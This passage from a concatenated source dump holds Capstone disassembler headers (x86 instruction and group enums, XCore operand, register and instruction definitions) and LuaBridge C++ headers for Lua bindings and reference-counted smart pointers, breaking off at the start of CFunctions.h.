	X86_INS_VPXORD,
	X86_INS_VPXORQ,
	X86_INS_VPXOR,
	X86_INS_VRCP14PD,
	X86_INS_VRCP14PS,
	X86_INS_VRCP14SD,
	X86_INS_VRCP14SS,
	X86_INS_VRCP28PD,
	X86_INS_VRCP28PS,
	X86_INS_VRCP28SD,
	X86_INS_VRCP28SS,
	X86_INS_VRCPPS,
	X86_INS_VRCPSS,
	X86_INS_VRNDSCALEPD,
	X86_INS_VRNDSCALEPS,
	X86_INS_VRNDSCALESD,
	X86_INS_VRNDSCALESS,
	X86_INS_VROUNDPD,
	X86_INS_VROUNDPS,
	X86_INS_VROUNDSD,
	X86_INS_VROUNDSS,
	X86_INS_VRSQRT14PD,
	X86_INS_VRSQRT14PS,
	X86_INS_VRSQRT14SD,
	X86_INS_VRSQRT14SS,
	X86_INS_VRSQRT28PD,
	X86_INS_VRSQRT28PS,
	X86_INS_VRSQRT28SD,
	X86_INS_VRSQRT28SS,
	X86_INS_VRSQRTPS,
	X86_INS_VRSQRTSS,
	X86_INS_VSCATTERDPD,
	X86_INS_VSCATTERDPS,
	X86_INS_VSCATTERPF0DPD,
	X86_INS_VSCATTERPF0DPS,
	X86_INS_VSCATTERPF0QPD,
	X86_INS_VSCATTERPF0QPS,
	X86_INS_VSCATTERPF1DPD,
	X86_INS_VSCATTERPF1DPS,
	X86_INS_VSCATTERPF1QPD,
	X86_INS_VSCATTERPF1QPS,
	X86_INS_VSCATTERQPD,
	X86_INS_VSCATTERQPS,
	X86_INS_VSHUFPD,
	X86_INS_VSHUFPS,
	X86_INS_VSQRTPD,
	X86_INS_VSQRTPS,
	X86_INS_VSQRTSD,
	X86_INS_VSQRTSS,
	X86_INS_VSTMXCSR,
	X86_INS_VSUBPD,
	X86_INS_VSUBPS,
	X86_INS_VSUBSD,
	X86_INS_VSUBSS,
	X86_INS_VTESTPD,
	X86_INS_VTESTPS,
	X86_INS_VUNPCKHPD,
	X86_INS_VUNPCKHPS,
	X86_INS_VUNPCKLPD,
	X86_INS_VUNPCKLPS,
	X86_INS_VZEROALL,
	X86_INS_VZEROUPPER,
	X86_INS_WAIT,
	X86_INS_WBINVD,
	X86_INS_WRFSBASE,
	X86_INS_WRGSBASE,
	X86_INS_WRMSR,
	X86_INS_XABORT,
	X86_INS_XACQUIRE,
	X86_INS_XBEGIN,
	X86_INS_XCHG,
	X86_INS_FXCH,
	X86_INS_XCRYPTCBC,
	X86_INS_XCRYPTCFB,
	X86_INS_XCRYPTCTR,
	X86_INS_XCRYPTECB,
	X86_INS_XCRYPTOFB,
	X86_INS_XEND,
	X86_INS_XGETBV,
	X86_INS_XLATB,
	X86_INS_XRELEASE,
	X86_INS_XRSTOR,
	X86_INS_XRSTOR64,
	X86_INS_XSAVE,
	X86_INS_XSAVE64,
	X86_INS_XSAVEOPT,
	X86_INS_XSAVEOPT64,
	X86_INS_XSETBV,
	X86_INS_XSHA1,
	X86_INS_XSHA256,
	X86_INS_XSTORE,
	X86_INS_XTEST,

	X86_INS_ENDING,	// mark the end of the list of insn
} x86_insn;

//> Group of X86 instructions
typedef enum  x86_insn_group {
	X86_GRP_INVALID = 0, // = CS_GRP_INVALID

	//> Generic groups
	// all jump instructions (conditional+direct+indirect jumps)
	X86_GRP_JUMP,	// = CS_GRP_JUMP
	// all call instructions
	X86_GRP_CALL,	// = CS_GRP_CALL
	// all return instructions
	X86_GRP_RET,	// = CS_GRP_RET
	// all interrupt instructions (int+syscall)
	X86_GRP_INT,	// = CS_GRP_INT
	// all interrupt return instructions
	X86_GRP_IRET,	// = CS_GRP_IRET

	//> Architecture-specific groups
	X86_GRP_VM = 128,	// all virtualization instructions (VT-x + AMD-V)
	X86_GRP_3DNOW,
	X86_GRP_AES,
	X86_GRP_ADX,
	X86_GRP_AVX,
	X86_GRP_AVX2,
	X86_GRP_AVX512,
	X86_GRP_BMI,
	X86_GRP_BMI2,
	X86_GRP_CMOV,
	X86_GRP_F16C,
	X86_GRP_FMA,
	X86_GRP_FMA4,
	X86_GRP_FSGSBASE,
	X86_GRP_HLE,
	X86_GRP_MMX,
	X86_GRP_MODE32,
	X86_GRP_MODE64,
	X86_GRP_RTM,
	X86_GRP_SHA,
	X86_GRP_SSE1,
	X86_GRP_SSE2,
	X86_GRP_SSE3,
	X86_GRP_SSE41,
	X86_GRP_SSE42,
	X86_GRP_SSE4A,
	X86_GRP_SSSE3,
	X86_GRP_PCLMUL,
	X86_GRP_XOP,
	X86_GRP_CDI,
	X86_GRP_ERI,
	X86_GRP_TBM,
	X86_GRP_16BITMODE,
	X86_GRP_NOT64BITMODE,
	X86_GRP_SGX,
	X86_GRP_DQI,
	X86_GRP_BWI,
	X86_GRP_PFI,
	X86_GRP_VLX,
	X86_GRP_SMAP,
	X86_GRP_NOVLX,

	X86_GRP_ENDING
} x86_insn_group;

#ifdef __cplusplus
}
#endif

#endif

```

`libs/Capstone/include/xcore.h`:

```h
#ifndef CAPSTONE_XCORE_H
#define CAPSTONE_XCORE_H

/* Capstone Disassembly Engine */
/* By Nguyen Anh Quynh <aquynh@gmail.com>, 2014 */

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include "platform.h"

#ifdef _MSC_VER
#pragma warning(disable:4201)
#endif

//> Operand type for instruction's operands
typedef enum xcore_op_type {
	XCORE_OP_INVALID = 0, // = CS_OP_INVALID (Uninitialized).
	XCORE_OP_REG, // = CS_OP_REG (Register operand).
	XCORE_OP_IMM, // = CS_OP_IMM (Immediate operand).
	XCORE_OP_MEM, // = CS_OP_MEM (Memory operand).
} xcore_op_type;

// Instruction's operand referring to memory
// This is associated with XCORE_OP_MEM operand type above
typedef struct xcore_op_mem {
	uint8_t base;	// base register
	uint8_t index;	// index register
	int32_t disp;	// displacement/offset value
	int     direct;	// +1: forward, -1: backward
} xcore_op_mem;

// Instruction operand
typedef struct cs_xcore_op {
	xcore_op_type type;	// operand type
	union {
		unsigned int reg;	// register value for REG operand
		int32_t imm;		// immediate value for IMM operand
		xcore_op_mem mem;		// base/disp value for MEM operand
	};
} cs_xcore_op;

// Instruction structure
typedef struct cs_xcore {
	// Number of operands of this instruction, 
	// or 0 when instruction has no operand.
	uint8_t op_count;
	cs_xcore_op operands[8]; // operands for this instruction.
} cs_xcore;

//> XCore registers
typedef enum xcore_reg {
	XCORE_REG_INVALID = 0,

	XCORE_REG_CP,
	XCORE_REG_DP,
	XCORE_REG_LR,
	XCORE_REG_SP,
	XCORE_REG_R0,
	XCORE_REG_R1,
	XCORE_REG_R2,
	XCORE_REG_R3,
	XCORE_REG_R4,
	XCORE_REG_R5,
	XCORE_REG_R6,
	XCORE_REG_R7,
	XCORE_REG_R8,
	XCORE_REG_R9,
	XCORE_REG_R10,
	XCORE_REG_R11,

	//> pseudo registers
	XCORE_REG_PC,	// pc

	// internal thread registers
	// see The-XMOS-XS1-Architecture(X7879A).pdf
	XCORE_REG_SCP,	// save pc
	XCORE_REG_SSR,	// save status
	XCORE_REG_ET,	// exception type
	XCORE_REG_ED,	// exception data
	XCORE_REG_SED,	// save exception data
	XCORE_REG_KEP,	// kernel entry pointer
	XCORE_REG_KSP,	// kernel stack pointer
	XCORE_REG_ID,	// thread ID

	XCORE_REG_ENDING,	// <-- mark the end of the list of registers
} xcore_reg;

//> XCore instruction
typedef enum xcore_insn {
	XCORE_INS_INVALID = 0,

	XCORE_INS_ADD,
	XCORE_INS_ANDNOT,
	XCORE_INS_AND,
	XCORE_INS_ASHR,
	XCORE_INS_BAU,
	XCORE_INS_BITREV,
	XCORE_INS_BLA,
	XCORE_INS_BLAT,
	XCORE_INS_BL,
	XCORE_INS_BF,
	XCORE_INS_BT,
	XCORE_INS_BU,
	XCORE_INS_BRU,
	XCORE_INS_BYTEREV,
	XCORE_INS_CHKCT,
	XCORE_INS_CLRE,
	XCORE_INS_CLRPT,
	XCORE_INS_CLRSR,
	XCORE_INS_CLZ,
	XCORE_INS_CRC8,
	XCORE_INS_CRC32,
	XCORE_INS_DCALL,
	XCORE_INS_DENTSP,
	XCORE_INS_DGETREG,
	XCORE_INS_DIVS,
	XCORE_INS_DIVU,
	XCORE_INS_DRESTSP,
	XCORE_INS_DRET,
	XCORE_INS_ECALLF,
	XCORE_INS_ECALLT,
	XCORE_INS_EDU,
	XCORE_INS_EEF,
	XCORE_INS_EET,
	XCORE_INS_EEU,
	XCORE_INS_ENDIN,
	XCORE_INS_ENTSP,
	XCORE_INS_EQ,
	XCORE_INS_EXTDP,
	XCORE_INS_EXTSP,
	XCORE_INS_FREER,
	XCORE_INS_FREET,
	XCORE_INS_GETD,
	XCORE_INS_GET,
	XCORE_INS_GETN,
	XCORE_INS_GETR,
	XCORE_INS_GETSR,
	XCORE_INS_GETST,
	XCORE_INS_GETTS,
	XCORE_INS_INCT,
	XCORE_INS_INIT,
	XCORE_INS_INPW,
	XCORE_INS_INSHR,
	XCORE_INS_INT,
	XCORE_INS_IN,
	XCORE_INS_KCALL,
	XCORE_INS_KENTSP,
	XCORE_INS_KRESTSP,
	XCORE_INS_KRET,
	XCORE_INS_LADD,
	XCORE_INS_LD16S,
	XCORE_INS_LD8U,
	XCORE_INS_LDA16,
	XCORE_INS_LDAP,
	XCORE_INS_LDAW,
	XCORE_INS_LDC,
	XCORE_INS_LDW,
	XCORE_INS_LDIVU,
	XCORE_INS_LMUL,
	XCORE_INS_LSS,
	XCORE_INS_LSUB,
	XCORE_INS_LSU,
	XCORE_INS_MACCS,
	XCORE_INS_MACCU,
	XCORE_INS_MJOIN,
	XCORE_INS_MKMSK,
	XCORE_INS_MSYNC,
	XCORE_INS_MUL,
	XCORE_INS_NEG,
	XCORE_INS_NOT,
	XCORE_INS_OR,
	XCORE_INS_OUTCT,
	XCORE_INS_OUTPW,
	XCORE_INS_OUTSHR,
	XCORE_INS_OUTT,
	XCORE_INS_OUT,
	XCORE_INS_PEEK,
	XCORE_INS_REMS,
	XCORE_INS_REMU,
	XCORE_INS_RETSP,
	XCORE_INS_SETCLK,
	XCORE_INS_SET,
	XCORE_INS_SETC,
	XCORE_INS_SETD,
	XCORE_INS_SETEV,
	XCORE_INS_SETN,
	XCORE_INS_SETPSC,
	XCORE_INS_SETPT,
	XCORE_INS_SETRDY,
	XCORE_INS_SETSR,
	XCORE_INS_SETTW,
	XCORE_INS_SETV,
	XCORE_INS_SEXT,
	XCORE_INS_SHL,
	XCORE_INS_SHR,
	XCORE_INS_SSYNC,
	XCORE_INS_ST16,
	XCORE_INS_ST8,
	XCORE_INS_STW,
	XCORE_INS_SUB,
	XCORE_INS_SYNCR,
	XCORE_INS_TESTCT,
	XCORE_INS_TESTLCL,
	XCORE_INS_TESTWCT,
	XCORE_INS_TSETMR,
	XCORE_INS_START,
	XCORE_INS_WAITEF,
	XCORE_INS_WAITET,
	XCORE_INS_WAITEU,
	XCORE_INS_XOR,
	XCORE_INS_ZEXT,

	XCORE_INS_ENDING,   // <-- mark the end of the list of instructions
} xcore_insn;

//> Group of XCore instructions
typedef enum xcore_insn_group {
	XCORE_GRP_INVALID = 0, // = CS_GRP_INVALID

	//> Generic groups
	// all jump instructions (conditional+direct+indirect jumps)
	XCORE_GRP_JUMP,	// = CS_GRP_JUMP

	XCORE_GRP_ENDING,   // <-- mark the end of the list of groups
} xcore_insn_group;

#ifdef __cplusplus
}
#endif

#endif

```

`libs/LuaBridge/LuaBridge.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>
  Copyright 2007, Nathan Reed

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

#ifndef LUABRIDGE_LUABRIDGE_HEADER
#define LUABRIDGE_LUABRIDGE_HEADER

// All #include dependencies are listed here
// instead of in the individual header files.
//
#include <cassert>
#include <sstream>
#include <stdexcept>
#include <string>
#include <typeinfo>

#define LUABRIDGE_MAJOR_VERSION 2
#define LUABRIDGE_MINOR_VERSION 0
#define LUABRIDGE_VERSION 200

namespace luabridge
{

// Forward declaration
//
template <class T>
struct Stack;

#include "detail/LuaHelpers.h"

#include "detail/TypeTraits.h"
#include "detail/TypeList.h"
#include "detail/FuncTraits.h"
#include "detail/Constructor.h"
#include "detail/Stack.h"
#include "detail/ClassInfo.h"

class LuaRef;

#include "detail/LuaException.h"
#include "detail/LuaRef.h"
#include "detail/Iterator.h"

//------------------------------------------------------------------------------
/**
    security options.
*/
class Security
{
public:
  static bool hideMetatables ()
  {
    return getSettings().hideMetatables;
  }

  static void setHideMetatables (bool shouldHide)
  {
    getSettings().hideMetatables = shouldHide;
  }

private:
  struct Settings
  {
    Settings () : hideMetatables (true)
    {
    }

    bool hideMetatables;
  };

  static Settings& getSettings ()
  {
    static Settings settings;
    return settings;
  }
};

#include "detail/Userdata.h"
#include "detail/CFunctions.h"
#include "detail/Namespace.h"

//------------------------------------------------------------------------------
/**
    Push an object onto the Lua stack.
*/
template <class T>
inline void push (lua_State* L, T t)
{
  Stack <T>::push (L, t);
}

//------------------------------------------------------------------------------
/**
  Set a global value in the lua_State.

  @note This works on any type specialized by `Stack`, including `LuaRef` and
        its table proxies.
*/
template <class T>
inline void setGlobal (lua_State* L, T t, char const* name)
{
  push (L, t);
  lua_setglobal (L, name);
}

//------------------------------------------------------------------------------
/**
  Change whether or not metatables are hidden (on by default).
*/
inline void setHideMetatables (bool shouldHide)
{
  Security::setHideMetatables (shouldHide);
}

}

#endif

```

`libs/LuaBridge/RefCountedObject.h`:

```h
//==============================================================================
/*
  https://github.com/vinniefalco/LuaBridge

  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>
  Copyright 2004-11 by Raw Material Software Ltd.

  This is a derivative work used by permission from part of
  JUCE, available at http://www.rawaterialsoftware.com

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.

  This file incorporates work covered by the following copyright and
  permission notice:  

    This file is part of the JUCE library - "Jules' Utility Class Extensions"
    Copyright 2004-11 by Raw Material Software Ltd.
*/
//==============================================================================

#ifndef LUABRIDGE_REFCOUNTEDOBJECT_HEADER
#define LUABRIDGE_REFCOUNTEDOBJECT_HEADER

//#define LUABRIDGE_COMPILER_SUPPORTS_MOVE_SEMANTICS 1

#include <cassert>

//==============================================================================
/**
  Adds reference-counting to an object.

  To add reference-counting to a class, derive it from this class, and
  use the RefCountedObjectPtr class to point to it.

  e.g. @code
  class MyClass : public RefCountedObjectType
  {
      void foo();

      // This is a neat way of declaring a typedef for a pointer class,
      // rather than typing out the full templated name each time..
      typedef RefCountedObjectPtr<MyClass> Ptr;
  };

  MyClass::Ptr p = new MyClass();
  MyClass::Ptr p2 = p;
  p = 0;
  p2->foo();
  @endcode

  Once a new RefCountedObjectType has been assigned to a pointer, be
  careful not to delete the object manually.
*/
template <class CounterType>
class RefCountedObjectType
{
public:
  //==============================================================================
  /** Increments the object's reference count.

      This is done automatically by the smart pointer, but is public just
      in case it's needed for nefarious purposes.
  */
  inline void incReferenceCount() const
  {
    ++refCount;
  }

  /** Decreases the object's reference count.

      If the count gets to zero, the object will be deleted.
  */
  inline void decReferenceCount() const
  {
    assert (getReferenceCount() > 0);

    if (--refCount == 0)
      delete this;
  }

  /** Returns the object's current reference count. */
  inline int getReferenceCount() const
  {
    return static_cast <int> (refCount);
  }

protected:
  //==============================================================================
  /** Creates the reference-counted object (with an initial ref count of zero). */
  RefCountedObjectType() : refCount ()
  {
  }

  /** Destructor. */
  virtual ~RefCountedObjectType()
  {
    // it's dangerous to delete an object that's still referenced by something else!
    assert (getReferenceCount() == 0);
  }

private:
  //==============================================================================
  CounterType mutable refCount;
};

//==============================================================================

/** Non thread-safe reference counted object.

    This creates a RefCountedObjectType that uses a non-atomic integer
    as the counter.
*/
typedef RefCountedObjectType <int> RefCountedObject;

//==============================================================================
/**
    A smart-pointer class which points to a reference-counted object.

    The template parameter specifies the class of the object you want to point
    to - the easiest way to make a class reference-countable is to simply make
    it inherit from RefCountedObjectType, but if you need to, you could roll
    your own reference-countable class by implementing a pair of methods called
    incReferenceCount() and decReferenceCount().

    When using this class, you'll probably want to create a typedef to
    abbreviate the full templated name - e.g.

    @code
    
    typedef RefCountedObjectPtr <MyClass> MyClassPtr;
    
    @endcode
*/
template <class ReferenceCountedObjectClass>
class RefCountedObjectPtr
{
public:
  /** The class being referenced by this pointer. */
  typedef ReferenceCountedObjectClass ReferencedType;

  //==============================================================================
  /** Creates a pointer to a null object. */
  inline RefCountedObjectPtr() : referencedObject (0)
  {
  }

  /** Creates a pointer to an object.

      This will increment the object's reference-count if it is non-null.
  */
  inline RefCountedObjectPtr (ReferenceCountedObjectClass* const refCountedObject)
      : referencedObject (refCountedObject)
  {
    if (refCountedObject != 0)
        refCountedObject->incReferenceCount();
  }

  /** Copies another pointer.
      This will increment the object's reference-count (if it is non-null).
  */
  inline RefCountedObjectPtr (const RefCountedObjectPtr& other)
      : referencedObject (other.referencedObject)
  {
    if (referencedObject != 0)
        referencedObject->incReferenceCount();
  }

#if LUABRIDGE_COMPILER_SUPPORTS_MOVE_SEMANTICS
  /** Takes-over the object from another pointer. */
  inline RefCountedObjectPtr (RefCountedObjectPtr&& other)
      : referencedObject (other.referencedObject)
  {
    other.referencedObject = 0;
  }
#endif

  /** Copies another pointer.
      This will increment the object's reference-count (if it is non-null).
  */
  template <class DerivedClass>
  inline RefCountedObjectPtr (const RefCountedObjectPtr<DerivedClass>& other)
      : referencedObject (static_cast <ReferenceCountedObjectClass*> (other.getObject()))
  {
    if (referencedObject != 0)
      referencedObject->incReferenceCount();
  }

  /** Changes this pointer to point at a different object.

      The reference count of the old object is decremented, and it might be
      deleted if it hits zero. The new object's count is incremented.
  */
  RefCountedObjectPtr& operator= (const RefCountedObjectPtr& other)
  {
    return operator= (other.referencedObject);
  }

  /** Changes this pointer to point at a different object.

      The reference count of the old object is decremented, and it might be
      deleted if it hits zero. The new object's count is incremented.
  */
  template <class DerivedClass>
  RefCountedObjectPtr& operator= (const RefCountedObjectPtr<DerivedClass>& other)
  {
    return operator= (static_cast <ReferenceCountedObjectClass*> (other.getObject()));
  }

#if LUABRIDGE_COMPILER_SUPPORTS_MOVE_SEMANTICS
  /** Takes-over the object from another pointer. */
  RefCountedObjectPtr& operator= (RefCountedObjectPtr&& other)
  {
    std::swap (referencedObject, other.referencedObject);
    return *this;
  }
#endif

  /** Changes this pointer to point at a different object.

      The reference count of the old object is decremented, and it might be
      deleted if it hits zero. The new object's count is incremented.
  */
  RefCountedObjectPtr& operator= (ReferenceCountedObjectClass* const newObject)
  {
    if (referencedObject != newObject)
    {
      if (newObject != 0)
        newObject->incReferenceCount();

      ReferenceCountedObjectClass* const oldObject = referencedObject;
      referencedObject = newObject;

      if (oldObject != 0)
        oldObject->decReferenceCount();
    }

    return *this;
  }

  /** Destructor.

      This will decrement the object's reference-count, and may delete it if it
      gets to zero.
  */
  inline ~RefCountedObjectPtr()
  {
    if (referencedObject != 0)
      referencedObject->decReferenceCount();
  }

  /** Returns the object that this pointer references.
      The pointer returned may be zero, of course.
  */
  inline operator ReferenceCountedObjectClass*() const
  {
    return referencedObject;
  }

  // the -> operator is called on the referenced object
  inline ReferenceCountedObjectClass* operator->() const
  {
    return referencedObject;
  }

  /** Returns the object that this pointer references.
      The pointer returned may be zero, of course.
  */
  inline ReferenceCountedObjectClass* getObject() const
  {
    return referencedObject;
  }

private:
  //==============================================================================
  ReferenceCountedObjectClass* referencedObject;
};

/** Compares two ReferenceCountedObjectPointers. */
template <class ReferenceCountedObjectClass>
bool operator== (const RefCountedObjectPtr<ReferenceCountedObjectClass>& object1, ReferenceCountedObjectClass* const object2)
{
    return object1.getObject() == object2;
}

/** Compares two ReferenceCountedObjectPointers. */
template <class ReferenceCountedObjectClass>
bool operator== (const RefCountedObjectPtr<ReferenceCountedObjectClass>& object1, const RefCountedObjectPtr<ReferenceCountedObjectClass>& object2)
{
    return object1.getObject() == object2.getObject();
}

/** Compares two ReferenceCountedObjectPointers. */
template <class ReferenceCountedObjectClass>
bool operator== (ReferenceCountedObjectClass* object1, RefCountedObjectPtr<ReferenceCountedObjectClass>& object2)
{
    return object1 == object2.getObject();
}

/** Compares two ReferenceCountedObjectPointers. */
template <class ReferenceCountedObjectClass>
bool operator!= (const RefCountedObjectPtr<ReferenceCountedObjectClass>& object1, const ReferenceCountedObjectClass* object2)
{
    return object1.getObject() != object2;
}

/** Compares two ReferenceCountedObjectPointers. */
template <class ReferenceCountedObjectClass>
bool operator!= (const RefCountedObjectPtr<ReferenceCountedObjectClass>& object1, RefCountedObjectPtr<ReferenceCountedObjectClass>& object2)
{
    return object1.getObject() != object2.getObject();
}

/** Compares two ReferenceCountedObjectPointers. */
template <class ReferenceCountedObjectClass>
bool operator!= (ReferenceCountedObjectClass* object1, RefCountedObjectPtr<ReferenceCountedObjectClass>& object2)
{
    return object1 != object2.getObject();
}

//==============================================================================

namespace luabridge
{

// forward declaration
template <class T>
struct ContainerTraits;

template <class T>
struct ContainerTraits <RefCountedObjectPtr <T> >
{
  typedef T Type;

  static T* get (RefCountedObjectPtr <T> const& c)
  {
    return c.getObject ();
  }
};

}

//==============================================================================

#endif


```

`libs/LuaBridge/RefCountedPtr.h`:

```h
//==============================================================================
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>
  Copyright 2007, Nathan Reed

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

#ifndef LUABRIDGE_REFCOUNTEDPTR_HEADER
#define LUABRIDGE_REFCOUNTEDPTR_HEADER

#ifdef _MSC_VER
# include <hash_map>
#else
# include <stdint.h>
# include <ext/hash_map>
#endif

//==============================================================================
/**
  Support for our RefCountedPtr.
*/
struct RefCountedPtrBase
{
  // Declaration of container for the refcounts
#ifdef _MSC_VER
  typedef stdext::hash_map <const void *, int> RefCountsType;
#else
  struct ptr_hash
  {
    size_t operator () (const void * const v) const
    {
      static __gnu_cxx::hash<unsigned int> H;
      return H(uintptr_t(v));
    }
  };
  typedef __gnu_cxx::hash_map<const void *, int, ptr_hash> RefCountsType;
#endif

protected:
  inline RefCountsType& getRefCounts ()
  {
    static RefCountsType refcounts;
    return refcounts ;
  }
};

//==============================================================================
/**
  A reference counted smart pointer.

  The api is compatible with boost::RefCountedPtr and std::RefCountedPtr, in the
  sense that it implements a strict subset of the functionality.

  This implementation uses a hash table to look up the reference count
  associated with a particular pointer.

  @tparam T The class type.

  @todo Decompose RefCountedPtr using a policy. At a minimum, the underlying
        reference count should be policy based (to support atomic operations)
        and the delete behavior should be policy based (to support custom
        disposal methods).

  @todo Provide an intrusive version of RefCountedPtr.
*/
template <class T>
class RefCountedPtr : private RefCountedPtrBase
{
public:
  template <typename Other>
  struct rebind
  {
    typedef RefCountedPtr <Other> other;
  };

  /** Construct as nullptr or from existing pointer to T.

      @param p The optional, existing pointer to assign from.
  */
  RefCountedPtr (T* p = 0) : m_p (p)
  {
    ++getRefCounts () [m_p];
  }

  /** Construct from another RefCountedPtr.

      @param rhs The RefCountedPtr to assign from.
  */
  RefCountedPtr (RefCountedPtr <T> const& rhs) : m_p (rhs.get())
  {
    ++getRefCounts () [m_p];
  }

  /** Construct from a RefCountedPtr of a different type.

      @invariant A pointer to U must be convertible to a pointer to T.

      @param  rhs The RefCountedPtr to assign from.
      @tparam U   The other object type.
  */
  template <typename U>
  RefCountedPtr (RefCountedPtr <U> const& rhs) : m_p (static_cast <T*> (rhs.get()))
  {
    ++getRefCounts () [m_p];
  }

  /** Release the object.

      If there are no more references then the object is deleted.
  */
  ~RefCountedPtr ()
  {
    reset();
  }

  /** Assign from another RefCountedPtr.

      @param  rhs The RefCountedPtr to assign from.
      @return     A reference to the RefCountedPtr.
  */
  RefCountedPtr <T>& operator= (RefCountedPtr <T> const& rhs)
  {
    if (m_p != rhs.m_p)
    {
      reset ();
      m_p = rhs.m_p;
      ++getRefCounts () [m_p];
    }
    return *this;
  }

  /** Assign from another RefCountedPtr of a different type.

      @note A pointer to U must be convertible to a pointer to T.

      @tparam U   The other object type.
      @param  rhs The other RefCountedPtr to assign from.
      @return     A reference to the RefCountedPtr.
  */
  template <typename U>
  RefCountedPtr <T>& operator= (RefCountedPtr <U> const& rhs)
  {
    reset ();
    m_p = static_cast <T*> (rhs.get());
    ++getRefCounts () [m_p];
    return *this;
  }

  /** Retrieve the raw pointer.

      @return A pointer to the object.
  */
  T* get () const
  {
    return m_p;
  }

  /** Retrieve the raw pointer.

      @return A pointer to the object.
  */
  T* operator* () const
  {
    return m_p;
  }

  /** Retrieve the raw pointer.

      @return A pointer to the object.
  */
  T* operator-> () const
  {
    return m_p;
  }

  /** Determine the number of references.

      @note This is not thread-safe.

      @return The number of active references.
  */
  long use_count () const
  {
    return getRefCounts () [m_p];
  }

  /** Release the pointer.

      The reference count is decremented. If the reference count reaches
      zero, the object is deleted.
  */
  void reset ()
  {
    if (m_p != 0)
    {
      if (--getRefCounts () [m_p] <= 0)
        delete m_p;

      m_p = 0;
    }
  }

private:
  T* m_p;
};

//==============================================================================

namespace luabridge
{

// forward declaration
template <class T>
struct ContainerTraits;

template <class T>
struct ContainerTraits <RefCountedPtr <T> >
{
  typedef T Type;

  static T* get (RefCountedPtr <T> const& c)
  {
    return c.get ();
  }
};

}

#endif

```

`libs/LuaBridge/detail/CFunctions.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

// We use a structure so we can define everything in the header.
//
struct CFunc
{
  //----------------------------------------------------------------------------
  /**
      __index metamethod for a namespace or class static members.

      This handles:
